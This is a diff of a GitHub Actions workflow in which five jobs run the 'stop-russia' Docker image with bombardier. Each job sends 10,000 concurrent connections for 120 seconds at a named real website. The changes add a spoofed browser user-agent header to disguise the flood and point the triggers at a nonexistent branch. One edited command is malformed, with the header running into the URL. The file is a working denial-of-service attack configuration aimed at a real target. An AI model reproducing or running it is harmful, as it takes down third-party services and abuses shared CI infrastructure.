@@ -1,12 +1,15 @@
+# UA
+# "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
+
 name: Run Docker Command
 
 on:
   push:
     branches:
-      - main
+      - notexist
   pull_request:
     branches:
-      - main
+      - notexist
 
 jobs:
   run-docker-command-1:
@@ -21,7 +24,7 @@ jobs:
         with:
             image: abagayev/stop-russia:latest
             run: | 
-                  bombardier -c 10000 -d 120s -l https://vulner.softnetsolutions.com.au
+                  bombardier -c 10000 -d 120s -l -H "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"https://vulner.softnetsolutions.com.au
 
   run-docker-command-2:
     runs-on: ubuntu-latest
@@ -35,7 +38,7 @@ jobs:
         with:
             image: abagayev/stop-russia:latest
             run: | 
-                  bombardier -c 10000 -d 120s -l https://vulner.softnetsolutions.com.au
+                  bombardier -c 10000 -d 120s -l -H "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" https://vulner.softnetsolutions.com.au
 
   run-docker-command-3:
     runs-on: ubuntu-latest
@@ -49,7 +52,7 @@ jobs:
         with:
             image: abagayev/stop-russia:latest
             run: | 
-                  bombardier -c 10000 -d 120s -l https://vulner.softnetsolutions.com.au
+                  bombardier -c 10000 -d 120s -l -H "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" https://vulner.softnetsolutions.com.au
   run-docker-command-4:
     runs-on: ubuntu-latest
 
@@ -62,7 +65,7 @@ jobs:
         with:
             image: abagayev/stop-russia:latest
             run: | 
-                  bombardier -c 10000 -d 120s -l https://vulner.softnetsolutions.com.au
+                  bombardier -c 10000 -d 120s -l -H "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" https://vulner.softnetsolutions.com.au
   run-docker-command-5:
     runs-on: ubuntu-latest
 
@@ -75,4 +78,4 @@ jobs:
         with:
             image: abagayev/stop-russia:latest
             run: | 
-                  bombardier -c 10000 -d 120s -l https://vulner.softnetsolutions.com.au
+                  bombardier -c 10000 -d 120s -l -H "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" https://vulner.softnetsolutions.com.au
